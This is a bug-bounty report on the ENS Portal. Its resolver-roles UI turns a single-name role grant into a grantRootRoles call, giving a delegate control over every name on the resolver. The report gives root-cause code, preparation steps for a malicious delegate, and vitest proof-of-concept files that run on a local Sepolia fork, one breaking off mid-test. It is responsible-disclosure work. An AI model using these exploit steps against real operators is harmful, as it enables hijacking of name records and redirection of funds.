# 92602 w a critical explorer causes a connected wallet to grant a delegate resolver control over every name instead of one

**Submitted on Sep 10th 2026 at 21:08:30 UTC by @v4rvl for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92602
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Summary

The resolver Roles table aggregates every EAC resource an account holds roles on into a single row, then throws away the per-resource scope and re-derives one name from an unrelated list. `groupRolesByAccount` resolves each role row's scope by looking its `resource` hash up in a map built from the resolver's indexed `nodes`, ignoring the `name` the indexer already returned on the role row itself. Any role whose resource is not in `nodes` contributes no name at all. `ResolverRolesSidebar` then reduces the row to one scope with `resolvedNames.find((n) => n !== '(root)') ?? ''`, and the empty string is the sentinel that `prepareGrantResolverRolesTransaction` treats as ROOT. A grant the operator makes from that row is encoded as `grantRootRoles(bitmap, account)` - authority over every name the resolver serves, with no name anywhere in the calldata. Submitted on a local Sepolia fork against a real `PermissionedResolver` deployed by the Explorer's own deploy intent, that grant let the delegate write `addr(60)` on a second name of the operator's that appears nowhere in the calldata: `getAddressRecord` for that name moved from `null` to `0x00000000000000000000000000000000defEc7ED` while the registry still returned the operator as its owner. With the correctly scoped `authorizeNameRoles` grant, the identical `setAddr` on that second name reverts and it still resolves to `null`. The same single-scope reduction runs in the other direction: a row that includes a root resource renders the caption "Global roles (all names)" while the revoke it builds is scoped to one name, and "Remove user ... from all roles" revokes the union of the account's roles on exactly one of the names the row lists.

## Root cause

Three lines, in three files.

**1. The scope the indexer supplied is discarded.** `apps/portal/src/features/resolver/hooks/useResolverOverview.ts:14-22` - every role row carries its own `name`:

```ts
export type ResolverRole = {
  readonly account: string
  readonly resource: string
  readonly roleBitmap: string
  readonly blockNumber: number
  readonly transactionHash: string | null
  readonly timestamp: number | null
  readonly name: string | null
}
```

`apps/portal/src/lib/roles/resolverRoles.ts:193-204` never reads it. It re-derives the name from `resourceToName` at `:197`, and drops the scope entirely when that lookup misses:

```ts
  for (const role of roles) {
    const account = role.account.toLowerCase()
    const resource = role.resource.toLowerCase()
    const decoded = decodeResolverRoleBitmap(role.roleBitmap)
    const resolvedName = resourceToName?.get(resource) ?? null

    const existing = grouped.get(account)

    if (existing) {
      existing.roles.push(role)
      existing.decodedRoles.push(...decoded)
      if (resolvedName) existing.resolvedNames.add(resolvedName)
```

`resourceToName` is built only from the resolver's `nodes` - `apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:102-105`:

```ts
  const data = useMemo(
    () => groupRolesByAccount(roles, buildResourceToNameMap(nodes)),
    [roles, nodes],
  )
```

`nodes` is the set of names currently pointing at this resolver (`useResolverOverview.ts:75-85`). A name that has roles authorised but is not pointed at the resolver - authorised ahead of the resolver change, or left behind after one - is absent from `nodes`, so its role row resolves to no name.

**2. The many-to-one reduction, with ROOT as the fallback.** `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:167-169`:

```ts
  const resolvedNames = row?.original.resolvedNames ?? []

  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

`roleName` is the only scope that reaches the transaction builders (`:299`, `:318`).

**3. The empty string is the ROOT sentinel.** `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-60`:

```ts
  const writeParams = grantResolverRolesWriteParameters(
    walletClient as Parameters<typeof grantResolverRolesWriteParameters>[0],
    name === ''
      ? {
          resolverAddress,
          targetAccount: account,
          scope: 'root',
          roles,
        }
      : {
          resolverAddress,
          targetAccount: account,
          scope: 'name',
          name,
          roles,
        },
  )
```

`scope: 'root'` encodes `grantRootRoles(roleBitmap, targetAccount)` (`@ensdomains/ensjs/src/actions/wallet/v2/grantResolverRoles.ts:114-120`), whose own doc comment reads "Grant roles globally (any name, any record type)" (`:46-47`). `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts` is the mirror image.

**The UI never states the widened scope.** `ResolverRolesSidebar.tsx:391-397` renders the scope caption only when the row has at least one resolved name:

```tsx
                {selectedAccount && resolvedNames.length > 0 && (
                  <p className="text-sm text-muted-foreground">
                    {resolvedNames.includes('(root)')
                      ? 'Global roles (all names)'
                      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
                  </p>
                )}
```

so the exact case that grants at ROOT is the case that renders no scope statement at all. `ResolverRolesTable.tsx:68-71` behaves the same way in the "Name" column (`if (names.length === 0) return null`).

## Steps to reproduce

1. A permissioned resolver `R` serves several names of an operator: `victim.eth`, `shop.victim.eth`, `treasury.victim.eth`.
2. The operator authorises delegate `D` for `ROLE_SET_ADDR` on `blog.victim.eth` in `R`. The operator also delegates the ordinary registry `ROLE_SET_RESOLVER` permission for `blog.victim.eth` to `D`, a normal operational role that the Portal exposes at `/$name/change-resolver`.
3. `D` uses that production route to set `blog.victim.eth` to another valid resolver. `PermissionedRegistry.setResolver` checks only the registry role and does not revoke EAC roles stored in the old resolver. `blog.victim.eth` therefore disappears from `R`'s current `nodes` while its name-scoped role row remains in `R`'s indexed role history.
4. The operator opens `/resolver/R/roles`. `D`'s row lists the held roles; the "Name" column is blank because the row's resource is not found in `nodes`.
5. The operator clicks edit. The sidebar shows `D`'s permission checkboxes and no scope caption. The operator makes a normal edit, such as adding "Set Text" to the existing "Set Address" permission, and clicks Save.
6. The wallet is asked to sign a call to `R`. The Explorer's step is titled "Save resolver role changes" / "Update roles for 0x...". The calldata is `grantRootRoles(0x11, D)`, even though the operator never selected root scope.
7. `D` now holds `ROLE_SET_ADDR` and `ROLE_SET_TEXT` at the resolver root. `D` calls `setAddr(namehash("shop.victim.eth"), 60, <D's address>)` on `R`. It succeeds, and forward resolution of `shop.victim.eth` returns `D`'s address while the registry still names the operator as owner. Executed on the fork below with two names of one operator; the second name is the one that was never delegated.

### How a malicious delegate prepares the stale row

This state does not require forged indexer data or a privileged deployment actor. The exact normal production path is:

1. The operator gives `D` a name-scoped resolver role on `R` and, for the same name, the ordinary registry `ROLE_SET_RESOLVER` permission. ENSv2 keeps these permissions in separate contracts.
2. `D` opens the Portal's `/$name/change-resolver` route. Its role query gates the page on `ROLE_SET_RESOLVER` (`apps/portal/src/routes/$name/change-resolver.tsx:47-55,98-121`). The form accepts a custom resolver address (`apps/portal/src/features/resolver/components/ChangeResolverForm.tsx:108-126,218-232`) and submits `setResolver(anyId, resolverAddress)` (`apps/portal/src/features/resolver/helpers/changeResolver.ts:55-76`).
3. On-chain, `PermissionedRegistry.setResolver` checks only the registry role and writes the resolver pointer (`contracts/src/registry/PermissionedRegistry.sol:137-141,565-577`). The old `PermissionedResolver` role remains because `authorizeNameRoles` stores it by name resource and does not require current registry membership (`contracts/src/resolver/PermissionedResolver.sol:249-276`).
4. The name is now absent from `R.nodes`, but the role row still carries the name in the indexer result (`apps/portal/src/features/resolver/hooks/useResolverOverview.ts:12-20,84-92`). The Portal ignores that field and resolves scope from current nodes only, so the operator sees a blank Name column and no scope warning.

The operator's subsequent edit is a normal wallet workflow. The operator can add another manager permission to the displayed delegate and click Save without ever selecting root scope. The sidebar passes the empty sentinel, and the helper's documented empty-name branch encodes `grantRootRoles`. The malicious delegate controls the hidden scope input by preparing the stale row; the operator still supplies the intended role edit and signature. This is the Critical row's modifying- transaction-arguments predicate, not a claim that the attacker can forge the operator's signature.

Mirror case, no absent name required:

1. `D` holds a root role and a name-scoped role on `blog.victim.eth`.
2. The sidebar caption reads "Global roles (all names)".
3. The operator unticks the permission and clicks Save. The calldata is `authorizeNameRoles(dnsEncode("blog.victim.eth"), 0x1, D, false)`.
4. `D`'s root role is untouched. The Explorer reports the transaction as successful.

## Proof of Concept

## Proof of concept

```ts
/**
 * Resolver role-grant scope collapses to ROOT.
 *
 * Drives the real production functions:
 *   - lib/roles/resolverRoles.ts        buildResourceToNameMap / groupRolesByAccount / computeNameResource
 *   - features/resolver/components/ResolverRolesSidebar.tsx:169   (the roleName expression, reproduced verbatim)
 *   - features/resolver/helpers/grantResolverRoles.ts             prepareGrantResolverRolesTransaction
 *   - features/resolver/helpers/revokeResolverRoles.ts            prepareRevokeResolverRolesTransaction
 *
 * Nothing about the outcome is mocked: the only mock is a local viem wallet
 * client, which supplies the signer identity and chain, never the scope
 * decision under test. The assertions decode the real calldata.
 */
import { describe, expect, it } from 'vitest'
import { createWalletClient, decodeFunctionData, http, toHex } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { packetToBytes } from 'viem/ens'
import {
  permissionedResolverAuthorizeNameRolesSnippet,
  permissionedResolverGrantRootRolesSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
} from '@/lib/roles/resolverRoles'
import { prepareGrantResolverRolesTransaction } from '@/features/resolver/helpers/grantResolverRoles'
import { prepareRevokeResolverRolesTransaction } from '@/features/resolver/helpers/revokeResolverRoles'

const RESOLVER = '0xe7B9A25607E02da8145E4eB1836CA539e53F11f7' as const
const DELEGATE = '0x000000000000000000000000000000000dEfeC70' as const

const walletClient = createWalletClient({
  account: privateKeyToAccount(
    '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
  ),
  chain: sepolia,
  transport: http('http://127.0.0.1:8546'),
})

/** Verbatim from ResolverRolesSidebar.tsx:169. */
const roleNameFromRow = (resolvedNames: readonly string[]): string =>
  resolvedNames.find((n) => n !== '(root)') ?? ''

/**
 * One indexer role row. The indexer returns `name` per row
 * (useResolverOverview.ts:21 `readonly name: string | null`); the production
 * grouping function never reads it.
 */
const roleRow = (account: string, name: string, roleBitmap: string) => ({
  account,
  resource: computeNameResource(name),
  roleBitmap,
  name,
})

const ROLE_SET_ADDR_BITMAP = (1n << 0n).toString()

describe('resolver role scope', () => {
  it('DEFECT: a name-scoped role whose name is absent from `nodes` grants at ROOT', () => {
    // The delegate holds ROLE_SET_ADDR scoped to exactly one name.
    const roles = [
      roleRow(DELEGATE, 'blog.victim.eth', ROLE_SET_ADDR_BITMAP),
    ]
    // The resolver's indexed node list does not contain that name. `nodes` is
    // the set of names currently pointing at this resolver; a name that has a
    // role authorised but is not (yet / any longer) pointed here is absent.
    const nodes = [
      { name: 'victim.eth' },
      { name: 'shop.victim.eth' },
      { name: 'treasury.victim.eth' },
    ]

    const [row] = groupRolesByAccount(roles, buildResourceToNameMap(nodes))

    // The name the indexer already supplied is discarded.
    expect(roles[0].name).toBe('blog.victim.eth')
    expect(row.resolvedNames).toEqual([])
    expect(row.resolvedNames.length).toBe(0)

    // ResolverRolesTable "Name" column renders null for length 0, and
    // ResolverRolesSidebar.tsx:391 skips the scope caption entirely.
    const scopeCaptionRendered = row.resolvedNames.length > 0
    expect(scopeCaptionRendered).toBe(false)

    // The scope that reaches the transaction builder.
    const roleName = roleNameFromRow(row.resolvedNames)
    expect(roleName).toBe('')

    const intent = prepareGrantResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR', 'ROLE_SET_TEXT'],
      walletClient,
      chainId: sepolia.id,
    })

    const decoded = decodeFunctionData({
      abi: permissionedResolverGrantRootRolesSnippet,
      data: intent.request.data,
    })

    expect(intent.request.to).toBe(RESOLVER)
    expect(decoded.functionName).toBe('grantRootRoles')
    // args = [roleBitmap, targetAccount]. No name anywhere in the calldata.
    expect(decoded.args?.[1]).toBe(DELEGATE)
    expect(intent.request.data.includes(
      toHex(packetToBytes('blog.victim.eth')).slice(2),
    )).toBe(false)

    console.log(
      '[DEFECT] scope caption rendered =',
      scopeCaptionRendered,
      '| roleName =',
      JSON.stringify(roleName),
      '| function =',
      decoded.functionName,
      '| calldata =',
      intent.request.data,
    )
  })

  it('CONTROL: same row, name present in `nodes` -> authorizeNameRoles', () => {
    const roles = [
      roleRow(DELEGATE, 'blog.victim.eth', ROLE_SET_ADDR_BITMAP),
    ]
    // ONE load-bearing condition changed: the role's name is in `nodes`.
    const nodes = [
      { name: 'victim.eth' },
      { name: 'blog.victim.eth' },
      { name: 'shop.victim.eth' },
      { name: 'treasury.victim.eth' },
    ]

    const [row] = groupRolesByAccount(roles, buildResourceToNameMap(nodes))

    expect(row.resolvedNames).toEqual(['blog.victim.eth'])
    const roleName = roleNameFromRow(row.resolvedNames)
    expect(roleName).toBe('blog.victim.eth')

    const intent = prepareGrantResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR', 'ROLE_SET_TEXT'],
      walletClient,
      chainId: sepolia.id,
    })

    const decoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: intent.request.data,
    })

    expect(decoded.functionName).toBe('authorizeNameRoles')
    expect(decoded.args?.[0]).toBe(toHex(packetToBytes('blog.victim.eth')))
    expect(decoded.args?.[2]).toBe(DELEGATE)
    expect(decoded.args?.[3]).toBe(true)

    console.log(
      '[CONTROL] roleName =',
      JSON.stringify(roleName),
      '| function =',
      decoded.functionName,
      '| dnsEncodedName =',
      decoded.args?.[0],
    )
  })

  it('DEFECT: caption says "Global roles (all names)" while revoke is name-scoped', () => {
    // The delegate holds a ROOT role AND a name-scoped role.
    const roles = [
      { account: DELEGATE, resource: `0x${'0'.repeat(64)}`, roleBitmap: ROLE_SET_ADDR_BITMAP, name: null },
      roleRow(DELEGATE, 'blog.victim.eth', ROLE_SET_ADDR_BITMAP),
    ]
    const nodes = [{ name: 'victim.eth' }, { name: 'blog.victim.eth' }]

    const [row] = groupRolesByAccount(roles, buildResourceToNameMap(nodes))

    // ResolverRolesSidebar.tsx:393-395 - the caption the operator reads.
    const caption = row.resolvedNames.includes('(root)')
      ? 'Global roles (all names)'
      : `Roles scoped to ${row.resolvedNames.filter((n) => n !== '(root)').join(', ')}`
    expect(caption).toBe('Global roles (all names)')

    const roleName = roleNameFromRow(row.resolvedNames)
    expect(roleName).toBe('blog.victim.eth')

    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR'],
      walletClient,
      chainId: sepolia.id,
    })

    const decoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: intent.request.data,
    })

    // Operator was told the roles are global; the revoke touches one name.
    expect(decoded.functionName).toBe('authorizeNameRoles')
    expect(decoded.args?.[0]).toBe(toHex(packetToBytes('blog.victim.eth')))
    expect(decoded.args?.[3]).toBe(false)

    console.log(
      '[DEFECT] caption =',
      JSON.stringify(caption),
      '| revoke function =',
      decoded.functionName,
      '| scope =',
      JSON.stringify(roleName),
    )
  })

  it('DEFECT: "Remove user from all roles" revokes on one name only', () => {
    const roles = [
      roleRow(DELEGATE, 'blog.victim.eth', ROLE_SET_ADDR_BITMAP),
      roleRow(DELEGATE, 'shop.victim.eth', (1n << 4n).toString()),
    ]
    const nodes = [{ name: 'blog.victim.eth' }, { name: 'shop.victim.eth' }]

    const [row] = groupRolesByAccount(roles, buildResourceToNameMap(nodes))

    expect(row.resolvedNames).toEqual(['blog.victim.eth', 'shop.victim.eth'])
    expect(row.decodedRoles).toEqual(['ROLE_SET_ADDR', 'ROLE_SET_TEXT'])

    const roleName = roleNameFromRow(row.resolvedNames)
    expect(roleName).toBe('blog.victim.eth')

    const intent = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: DELEGATE,
      roles: row.decodedRoles as never,
      walletClient,
      chainId: sepolia.id,
    })

    const decoded = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: intent.request.data,
    })

    // One transaction, one name. shop.victim.eth is never named in calldata.
    expect(decoded.args?.[0]).toBe(toHex(packetToBytes('blog.victim.eth')))
    expect(
      intent.request.data.includes(
        toHex(packetToBytes('shop.victim.eth')).slice(2),
      ),
    ).toBe(false)

    console.log(
      '[DEFECT] dialog claims "remove this user from all roles"; names in row =',
      JSON.stringify(row.resolvedNames),
      '| names in calldata = ["blog.victim.eth"]',
    )
  })
})
```

Command:

```
pnpm --filter portal exec vitest run src/portal2_resolver_role_scope.test.ts --reporter=verbose --silent=false
```

Captured output:

```
stdout | src/portal2_resolver_role_scope.test.ts > resolver role scope > DEFECT: a name-scoped role whose name is absent from `nodes` grants at ROOT
[DEFECT] scope caption rendered = false | roleName = "" | function = grantRootRoles | calldata = 0x072d5d770000000000000000000000000000000000000000000000000000000000000011000000000000000000000000000000000000000000000000000000000defec70

stdout | src/portal2_resolver_role_scope.test.ts > resolver role scope > CONTROL: same row, name present in `nodes` -> authorizeNameRoles
[CONTROL] roleName = "blog.victim.eth" | function = authorizeNameRoles | dnsEncodedName = 0x04626c6f670676696374696d0365746800

stdout | src/portal2_resolver_role_scope.test.ts > resolver role scope > DEFECT: caption says "Global roles (all names)" while revoke is name-scoped
[DEFECT] caption = "Global roles (all names)" | revoke function = authorizeNameRoles | scope = "blog.victim.eth"

stdout | src/portal2_resolver_role_scope.test.ts > resolver role scope > DEFECT: "Remove user from all roles" revokes on one name only
[DEFECT] dialog claims "remove this user from all roles"; names in row = ["blog.victim.eth","shop.victim.eth"] | names in calldata = ["blog.victim.eth"]

 ✓ src/portal2_resolver_role_scope.test.ts > resolver role scope > DEFECT: a name-scoped role whose name is absent from `nodes` grants at ROOT 10ms
 ✓ src/portal2_resolver_role_scope.test.ts > resolver role scope > CONTROL: same row, name present in `nodes` -> authorizeNameRoles 2ms
 ✓ src/portal2_resolver_role_scope.test.ts > resolver role scope > DEFECT: caption says "Global roles (all names)" while revoke is name-scoped 1ms
 ✓ src/portal2_resolver_role_scope.test.ts > resolver role scope > DEFECT: "Remove user from all roles" revokes on one name only 1ms

 Test Files  1 passed (1)
      Tests  4 passed (4)
   Start at  22:03:12
   Duration  4.14s (transform 489ms, setup 190ms, import 3.20s, tests 16ms, environment 486ms)
```

Calldata reading, defect case: selector `0x072d5d77` is `grantRootRoles(uint256,address)`; argument 0 is `0x11` (`ROLE_SET_ADDR = 1 << 0` OR `ROLE_SET_TEXT = 1 << 4`); argument 1 is the delegate. The DNS-encoded name `0x04626c6f670676696374696d0365746800` present in the control calldata is absent from the defect calldata - asserted, not eyeballed.

### Terminal endpoint - the grant submitted on chain and exercised on a second name

The arm above ends at the calldata. This arm submits that calldata on a local Anvil fork of Sepolia and has the delegate use what it granted, on a name the operator never delegated. The control arm repeats it with the correctly scoped grant.

Save as `apps/portal/src/__term2__/term2_resolver_root_scope_onchain.test.ts` and run

```bash
pnpm --filter portal exec vitest run \
  src/__term2__/term2_resolver_root_scope_onchain.test.ts \
  --reporter=verbose --silent=false
```

The resolver is not a stub. It is a real `PermissionedResolver` proxy deployed by the Explorer's own `prepareDeployPermissionedResolverTransaction` (`apps/portal/src/features/resolver/hooks/useDeployPermissionedResolver.ts:60-77`) through the deployed `VerifiableFactory` at `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef`. The scope that reaches the builder is still derived by the real `groupRolesByAccount` and the sidebar's own `roleName` expression, not handed in. The endpoint is `getAddressRecord`, the same function `apps/portal/src/features/transfer/queries/getEthAddress.ts:13` uses to decide the address a transfer is sent to.

```ts
/**
 * Terminal endpoint - the root-scoped grant the Explorer
 * builds is submitted on a local Anvil fork of Sepolia, and the delegate then
 * exercises it on a SECOND name the operator never delegated.
 *
 * Everything that decides the outcome is production code:
 *   - lib/roles/resolverRoles.ts     buildResourceToNameMap / groupRolesByAccount / computeNameResource
 *   - ResolverRolesSidebar.tsx:169   the roleName expression, reproduced verbatim
 *   - features/resolver/helpers/grantResolverRoles.ts   prepareGrantResolverRolesTransaction
 *   - features/resolver/hooks/useDeployPermissionedResolver.ts
 *                                    prepareDeployPermissionedResolverTransaction
 *   - @ensdomains/ensjs/public       getAddressRecord, the Explorer's own name -> address query
 *
 * The resolver is a real PermissionedResolver proxy deployed through the
 * deployed VerifiableFactory. No transaction is sent to a public network.
 */
import { getAddressRecord } from '@ensdomains/ensjs/public'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'
import {
  type Address,
  createPublicClient,
  createWalletClient,
  decodeEventLog,
  decodeFunctionData,
  encodeFunctionData,
  type Hex,
  http,
  namehash,
  parseAbi,
  type PublicClient,
  toHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { packetToBytes } from 'viem/ens'
import {
  permissionedResolverAuthorizeNameRolesSnippet,
  permissionedResolverGrantRootRolesSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import { describe, expect, it } from 'vitest'
import { prepareGrantResolverRolesTransaction } from '@/features/resolver/helpers/grantResolverRoles'
import { prepareDeployPermissionedResolverTransaction } from '@/features/resolver/hooks/useDeployPermissionedResolver'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
} from '@/lib/roles/resolverRoles'
import { sepoliaWithEns } from '@/lib/wagmi'

const RPC = process.env.TERM2_FORK_RPC ?? 'http://127.0.0.1:8546'
const V2_ETH_REGISTRY: Address = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const V2_ETH_REGISTRAR: Address = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const VERIFIABLE_FACTORY: Address = '0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef'

/** The resolver operator. A fresh key, so the account carries no 7702 code. */
const OPERATOR_KEY: Hex =
  '0x0000000000000000000000000000000000000000000000000000000074657232'
const OPERATOR = privateKeyToAccount(OPERATOR_KEY)
/** The delegate the operator means to authorise on exactly one name. */
const DELEGATE: Address = '0x000000000000000000000000000000000dEfeC70'
/** The address the delegate writes into the second name's `addr(60)`. */
const DELEGATE_PAYOUT: Address = '0x00000000000000000000000000000000DefEc7ed'
const ZERO: Address = '0x0000000000000000000000000000000000000000'

/** ALL_ROLES, as the app writes it in permissionedResolverAddress.ts. */
const ALL_ROLES = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)

const pub = createPublicClient({
  chain: sepoliaWithEns,
  transport: http(RPC),
}) as PublicClient
const ensClient = createPublicClient({
  chain: sepoliaWithEns,
  transport: http(RPC),
})
const walletClient = createWalletClient({
  account: OPERATOR,
  chain: sepoliaWithEns,
  transport: http(RPC),
})

const rpc = (method: string, params: unknown[]) =>
  fetch(RPC, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then((r) => r.json() as Promise<{ result?: string; error?: unknown }>)

type SendResult = { ok: boolean; detail?: string }

const send = async (
  from: Address,
  to: Address,
  data: Hex,
  gas = '0x2DC6C0',
): Promise<SendResult> => {
  const r = await rpc('eth_sendTransaction', [{ from, to, data, gas }])
  await rpc('evm_mine', [])
  if (!r.result) return { ok: false, detail: JSON.stringify(r.error).slice(0, 220) }
  const receipt = await pub.getTransactionReceipt({ hash: r.result as Hex })
  return { ok: receipt.status === 'success' }
}

const registryAbi = parseAbi([
  'function register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry) returns (uint256)',
  'function getOwner(uint256 anyId) view returns (address)',
  'function getResolver(string label) view returns (address)',
])
const resolverAbi = parseAbi([
  'function setAddr(bytes32 node, uint256 coinType, bytes a)',
  'function addr(bytes32 node, uint256 coinType) view returns (bytes)',
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
])
const factoryEventAbi = parseAbi([
  'event ProxyDeployed(address indexed sender, address indexed proxyAddress, uint256 salt, address implementation)',
])

/** Verbatim from ResolverRolesSidebar.tsx:169. */
const roleNameFromRow = (resolvedNames: readonly string[]): string =>
  resolvedNames.find((n) => n !== '(root)') ?? ''

/** One indexer role row, shaped as useResolverOverview.ts:14-22 declares. */
const roleRow = (account: string, name: string, roleBitmap: string) => ({
  account,
  resource: computeNameResource(name),
  roleBitmap,
  name,
})

const ROLE_SET_ADDR = 1n << 0n
const ROLE_SET_TEXT = 1n << 4n
const ROLE_SET_ADDR_BITMAP = ROLE_SET_ADDR.toString()

const fund = async (a: Address) =>
  rpc('anvil_setBalance', [a, '0x3635C9ADC5DEA00000'])

/** Deploy a PermissionedResolver with the Explorer's own deploy intent. */
const deployResolver = async (): Promise<Address> => {
  const intent = prepareDeployPermissionedResolverTransaction({
    from: OPERATOR.address,
    chainId: sepoliaWithEns.id,
    salt: BigInt(Date.now()) * 1_000_003n,
  })
  const r = await rpc('eth_sendTransaction', [
    {
      from: intent.request.from,
      to: intent.request.to,
      data: intent.request.data,
      gas: '0x2DC6C0',
    },
  ])
  await rpc('evm_mine', [])
  expect(r.result).toBeTruthy()
  const receipt = await pub.getTransactionReceipt({ hash: r.result as Hex })
  expect(receipt.status).toBe('success')
  expect(intent.request.to.toLowerCase()).toBe(VERIFIABLE_FACTORY.toLowerCase())
  for (const log of receipt.logs) {
    try {
      const decoded = decodeEventLog({
        abi: factoryEventAbi,
        data: log.data,
        topics: log.topics as [Hex, ...Hex[]],
      })
      if (decoded.eventName === 'ProxyDeployed')
        return decoded.args.proxyAddress as Address
    } catch {
      // not the ProxyDeployed log
    }
  }
  throw new Error('no ProxyDeployed log')
}

/** Register a v2 .eth name owned by the operator and pointed at `resolver`. */
const makeName = async (label: string, resolver: Address) => {
  const expiry = BigInt(Math.floor(Date.now() / 1000) + 31_536_000)
  const res = await send(
    V2_ETH_REGISTRAR,
    V2_ETH_REGISTRY,
    encodeFunctionData({
      abi: registryAbi,
      functionName: 'register',
      args: [label, OPERATOR.address, ZERO, resolver, ALL_ROLES, expiry],
    }),
    '0xF4240',
  )
  expect(res).toMatchObject({ ok: true })
  return { label, name: `${label}.eth`, node: namehash(`${label}.eth`) }
}

const setAddrAsDelegate = (resolver: Address, node: Hex) =>
  send(
    DELEGATE,
    resolver,
    encodeFunctionData({
      abi: resolverAbi,
      functionName: 'setAddr',
      args: [node, 60n, DELEGATE_PAYOUT],
    }),
  )

const resolveEth = async (name: string): Promise<string | null> => {
  const record = await getAddressRecord(ensClient, { name, coin: 60 }).catch(
    () => null,
  )
  return record?.value ?? null
}

describe('the Explorer root-scope collapse, exercised on chain', () => {
  it('TERMINAL: root grant lets the delegate rewrite a second name; the scoped grant does not', async () => {
    const stamp = Date.now().toString(36)
    await fund(OPERATOR.address)
    await fund(DELEGATE)
    await fund(V2_ETH_REGISTRAR)

    // ================= ATTACK ARM =================
    const resolverA = await deployResolver()
    // Two names of the operator, both served by the same resolver.
    const delegated = await makeName(`term2rd${stamp}`, resolverA)
    const bystander = await makeName(`term2rb${stamp}`, resolverA)
    console.log(
      `[setup] resolver=${resolverA} delegatedName=${delegated.name} bystanderName=${bystander.name}`,
    )

    // The row the Explorer renders: the delegate holds ROLE_SET_ADDR scoped to
    // `delegated.name`, and that name is NOT in the resolver's indexed `nodes`.
    // `nodes` is the set of names the indexer has seen pointing here; a name
    // authorised ahead of the resolver change is absent from it.
    const roles = [roleRow(DELEGATE, delegated.name, ROLE_SET_ADDR_BITMAP)]
    const nodes = [{ name: bystander.name }]
    const [row] = groupRolesByAccount(roles, buildResourceToNameMap(nodes))

    expect(roles[0].name).toBe(delegated.name)
    expect(row.resolvedNames).toEqual([])
    // ResolverRolesSidebar.tsx:391 renders the scope caption only when
    // resolvedNames.length > 0, so the operator is shown no scope at all.
    expect(row.resolvedNames.length > 0).toBe(false)

    const roleName = roleNameFromRow(row.resolvedNames)
    expect(roleName).toBe('')

    const intent = prepareGrantResolverRolesTransaction({
      resolverAddress: resolverA,
      name: roleName,
      account: DELEGATE,
      roles: ['ROLE_SET_ADDR', 'ROLE_SET_TEXT'],
      walletClient,
      chainId: sepoliaWithEns.id,
    })
    const decoded = decodeFunctionData({
      abi: permissionedResolverGrantRootRolesSnippet,
      data: intent.request.data,
    })
    expect(decoded.functionName).toBe('grantRootRoles')
    expect(decoded.args?.[0]).toBe(ROLE_SET_ADDR | ROLE_SET_TEXT)
    expect(decoded.args?.[1]).toBe(DELEGATE)
    // the delegated name is not in the calldata at all
    expect(
      intent.request.data.includes(
        toHex(packetToBytes(delegated.name)).slice(2),
      ),
    ).toBe(false)
    console.log(
      `[attack] calldata = ${intent.request.data} (grantRootRoles(0x${(ROLE_SET_ADDR | ROLE_SET_TEXT).toString(16)}, ${DELEGATE}))`,
    )

    // The operator signs it. This is the transaction the Explorer submits.
    const grant = await send(
      intent.request.from as Address,
      intent.request.to as Address,
      intent.request.data,
    )
    expect(grant.ok).toBe(true)

    const rootHeld = await pub.readContract({
      address: resolverA,
      abi: resolverAbi,
      functionName: 'hasRootRoles',
      args: [ROLE_SET_ADDR | ROLE_SET_TEXT, DELEGATE],
    })
    expect(rootHeld).toBe(true)

    // ---- the endpoint: the delegate rewrites the OTHER name ----
    const bystanderBefore = await resolveEth(bystander.name)
    const write = await setAddrAsDelegate(resolverA, bystander.node as Hex)
    const bystanderAfter = await resolveEth(bystander.name)
    const bystanderOwner = await pub.readContract({
      address: V2_ETH_REGISTRY,
      abi: registryAbi,
      functionName: 'getOwner',
      args: [labelToCanonicalId(bystander.label)],
    })
    console.log(
      `[TERMINAL] ${bystander.name} owner=${bystanderOwner} addr(60) ${bystanderBefore} -> ${bystanderAfter} write.ok=${write.ok}`,
    )
    expect(write.ok).toBe(true)
    expect(bystanderBefore).toBe(null)
    expect(bystanderAfter?.toLowerCase()).toBe(DELEGATE_PAYOUT.toLowerCase())
